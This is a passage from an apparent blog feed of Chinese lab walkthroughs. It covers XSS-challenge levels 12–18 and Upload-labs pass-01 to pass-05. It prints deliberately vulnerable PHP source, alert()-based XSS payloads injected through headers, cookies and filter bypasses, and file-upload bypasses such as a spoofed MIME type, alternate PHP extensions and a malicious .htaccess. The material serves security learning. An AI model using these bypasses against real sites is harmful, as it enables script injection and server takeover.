class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>基本上换汤不换药，就是从上一题的Referer请求头参数变成了UA头……</p><p><a href="https://imgchr.com/i/Ayk20U" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/01/Ayk20U.md.png" alt="Ayk20U.md.png"></a></p><p>直接用上一关的payload即可</p><p>payload：<code>User-Agent: &quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-13"><a href="#level-13" class="headerlink" title="level-13"></a>level-13</h2><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level13.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现又有一个新参数cookie…套路一样，不多说</p><p>payload：<code>Cookie: user=&quot; onkeypress=&quot;alert(&#39;xss&#39;)&quot; type=&quot;text&quot;</code></p><h2 id="level-14"><a href="#level-14" class="headerlink" title="level-14"></a>level-14</h2><p>查看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>发现链接:<code>www.exifviewer.org</code>；应该是个漏洞环境…但是可能下线了…没有办法做，但是也可以了解一波；</p><p>这个漏洞是利用上传图片的Exif（可以记录数码照片的属性信息和拍摄数据，Exif信息是可以被任意编辑的）值进行构造xss（真的是骚），也算是个存储型xss；</p><p>附上此漏洞的乌云镜像链接：<a href="http://www.anquan.us/static/bugs/wooyun-2012-07468.html" target="_blank" rel="noopener">http://www.anquan.us/static/bugs/wooyun-2012-07468.html</a></p><h2 id="level-15"><a href="#level-15" class="headerlink" title="level-15"></a>level-15</h2><p>摸不着头脑…只好查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是使用了一个<code>ng-include</code>指令，先来了解一下用法：</p><p><a href="https://imgchr.com/i/A60n1J" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/02/A60n1J.md.png" alt="A60n1J.md.png"></a></p><p>也就是常说的文件包含，先包含一个同一个目录下的文件试一下：</p><p><a href="https://imgchr.com/i/A6sGqA" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/04/02/A6sGqA.md.png" alt="A6sGqA.md.png"></a></p><p>发现已经出现第三关的页面，这里要注意的是，字符串经过了htmlspecialchars()函数，所以尽量不要使用payload里出现<code>&lt;&gt;</code>的关卡</p><p>payload：<code>?src=&quot;level3.php?keyword=&#39; onkeypress=&#39;alert(2333)&quot;</code></p><h2 id="level-16"><a href="#level-16" class="headerlink" title="level-16"></a>level-16</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现过滤了<code>script,空格，/</code>，script被转义，那我们可以换一种标签img，这样的话也不需要使用/，一举多得，但是还有一个问题就是空格如何绕过，这里采取编码的方式，用<code>%0d</code> <code>%0a</code> 进行绕过</p><p>payload：<code>?keyword=&lt;img%0dsrc=1%0donerror=&quot;alert(2333)&quot;&gt;</code></p><h2 id="level-17"><a href="#level-17" class="headerlink" title="level-17"></a>level-17</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>发现是\<embed> 标签，用来定义嵌入的内容，比如插件；这里我们可以使用html事件属性去构造弹窗；</p><p>payload：<code>?arg01=a&amp;arg02=b onmouseover=alert(23333)</code></p><h2 id="level-18"><a href="#level-18" class="headerlink" title="level-18"></a>level-18</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>和上题一毛一样…不再赘述；</p><p>payload：<code>?arg01=a&amp;arg02=b onmouseover=alert(2333)</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;XSS-初体验~
    
    </summary>
    
      <category term="靶场通关笔记" scheme="https://gardenia30.top/categories/%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="Web" scheme="https://gardenia30.top/tags/Web/"/>
    
      <category term="XSS" scheme="https://gardenia30.top/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>Upload-labs通关笔记</title>
    <link href="https://gardenia30.top/2019/02/19/Upload-labs%E9%80%9A%E5%85%B3%E7%AC%94%E8%AE%B0/"/>
    <id>https://gardenia30.top/2019/02/19/Upload-labs通关笔记/</id>
    <published>2019-02-19T12:16:10.000Z</published>
    <updated>2019-04-09T09:29:29.263Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>从打完校赛开始到现在，身为萌新，寒假就研究了一下文件上传这部分内容，还是自己动手实践一下比较好，还可以学学代码审计；<a id="more"></a></p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="客户端校验"><a href="#客户端校验" class="headerlink" title="客户端校验"></a>客户端校验</h2><p>任何客户端验证都是不安全的，客户端验证只能用来防止用户输入错误，减少服务器的开销，服务器端验证才可以真正抵御攻击者；</p><h3 id="pass-01-js验证"><a href="#pass-01-js验证" class="headerlink" title="pass-01-js验证"></a>pass-01-js验证</h3><p>php为后缀的文件上传不了，发现前端的javascript验证；</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">'upload_file'</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">""</span>) &#123;</span><br><span class="line">            alert(<span class="string">"请选择要上传的文件!"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">".jpg|.png|.gif"</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">"."</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">"该文件不允许上传，请上传"</span> + allow_ext + <span class="string">"类型的文件,当前文件类型为："</span> + ext_name;</span><br><span class="line">            alert(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如此一来就很简单了，直接禁用js即可上传可解析的脚本文件；还有很多方法，先将脚本文件改为可以上传的后缀名，如<code>less1.jpg</code>，然后bp截取修改后缀为脚本文件的类型上传即可；</p><p>上传成功后如下直接可以访问；</p><p><a href="https://imgchr.com/i/kaLoSs" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaLoSs.png" alt="kaLoSs.png"></a></p><h2 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h2><h3 id="pass-02-MIME验证"><a href="#pass-02-MIME验证" class="headerlink" title="pass-02-MIME验证"></a>pass-02-MIME验证</h3><p>黑盒情况下上传<code>gardenia.jpg</code>，bp截取后修改后缀为可执行脚本后缀<code>.php</code>可以直接上传成功，访问成功；</p><p><a href="https://imgchr.com/i/kaO8AS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaO8AS.png" alt="kaO8AS.png"></a></p><p>审计一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/jpeg'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/png'</span>) || ($_FILES[<span class="string">'upload_file'</span>][<span class="string">'type'</span>] == <span class="string">'image/gif'</span>)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH . <span class="string">'/'</span> . $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'文件类型不正确，请重新上传！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH.<span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现了关键的判断是对<code>type</code>的判断，由此想到是对文件MIME类型进行验证；</p><p>上面的黑盒条件下的尝试也是偶然的巧合，因为刚开始的脚本被改成了<code>.jpg</code>为后缀，所以bp截包所看见的MIME检测到的类型就理所当然是<code>image/jpeg</code>，所以在这样的情况下将<code>.jpg</code>修改为<code>.php</code>就可以上传成功；</p><p><a href="https://imgchr.com/i/kavVtU" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavVtU.png" alt="kavVtU.png"></a></p><p>正确的姿势如下：</p><p>上传<code>.php</code>文件，截包，发现MIME类型如下：</p><p><a href="https://imgchr.com/i/kavGtO" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavGtO.png" alt="kavGtO.png"></a></p><p>修改<code>Content-Type</code>为代码中pass的类型即可：</p><p><a href="https://imgchr.com/i/kavHCF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kavHCF.png" alt="kavHCF.png"></a></p><p>上传成功：</p><p><img src="https://s2.ax1x.com/2019/02/11/kaxVbt.png" alt="kaxVbt.png"></p><h3 id="pass-03-上传特殊可解析后缀"><a href="#pass-03-上传特殊可解析后缀" class="headerlink" title="pass-03-上传特殊可解析后缀"></a>pass-03-上传特殊可解析后缀</h3><p><strong>solution1</strong></p><p>黑盒情况下上传<code>.php</code>文件得到提示：不允许上传.asp .aspx .php .jsp后缀文件！猜测应该是设置了黑名单；于是尝试上传<code>.php5</code>为后缀的文件，上传成功并且成功回显访问路径；</p><p><img src="https://s2.ax1x.com/2019/02/11/kaxIsA.png" alt="kaxIsA.png"></p><p>但奇怪的是<code>php5</code>无法被服务器解析，经Google得知是apache服务器配置的问题，在<code>httpd.conf</code>文件中查看是否有如下语句，如果没有，添加即可；</p><p><code>AddType application/x-httpd-php .php .phtml .php5 .phps .php3 .pht</code></p><p><a href="https://imgchr.com/i/kaz0Ff" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/02/11/kaz0Ff.png" alt="kaz0Ff.png"></a></p><p>审计源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);<span class="comment">//黑名单</span></span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//转换为小写</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'不允许上传.asp,.aspx,.php,.jsp后缀文件！'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很明显是设置了黑名单的<code>$deny_ext = array(&#39;.asp&#39;,&#39;.aspx&#39;,&#39;.php&#39;,&#39;.jsp&#39;);</code>而且其中将文件名进行了改写，所以访问文件的时候路径需要注意；</p><p><strong>solution2</strong></p><p>如果发现上传<code>.php5,.phtml,.pht</code>一类无法解析，就可以尝试使用<code>.htaccess</code>；见pass-04；</p><h3 id="pass-04-上传-htaccess"><a href="#pass-04-上传-htaccess" class="headerlink" title="pass-04-上传.htaccess"></a>pass-04-上传.htaccess</h3><p>这题在黑盒情况下测试pass-03的多数情况都是不可以的，查看一下源码：</p><p><code>$deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;);</code></p><p>发现黑名单过滤了几乎所有的我了解到的特殊后缀，唯独没有过滤<code>.htaccess</code>，所以可以通过上传此文件达到重写文件解析，前提是apache的配置文件conf里有这样配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride All</span><br><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure><p>于是创建<code>.htaccess</code>文件内容如下，上传，用于解析指定路径里指定文件名的文件为php脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;gardenia&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>此时创建文件名为<code>gardenia</code>的php脚本文件，无需后缀名，上传即可解析为php脚本；</p><p>解析成功：</p><p><img src="https://s2.ax1x.com/2019/02/12/kwhR2V.png" alt="kwhR2V.png"></p><h3 id="pass-05-大小写绕过"><a href="#pass-05-大小写绕过" class="headerlink" title="pass-05-大小写绕过"></a>pass-05-大小写绕过</h3><p>在黑盒情况下，发现无法上传.htaccess文件和其他特殊后缀，查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//首尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> 